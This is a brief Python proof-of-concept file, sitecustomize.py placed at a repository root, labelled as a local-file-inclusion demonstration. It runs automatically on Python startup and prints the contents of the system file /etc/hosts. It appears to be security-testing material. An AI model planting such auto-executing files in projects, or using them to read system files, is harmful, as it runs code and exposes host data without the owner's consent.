# sitecustomize.py (repo root)
try:
    print("=== LFI PoC START (sitecustomize) ===")
    with open("/etc/hosts","r") as f:
        print(f.read()[:1000])
    print("=== LFI PoC END (sitecustomize) ===")
except Exception as e:
    print(f"[sitecustomize error] {e}")
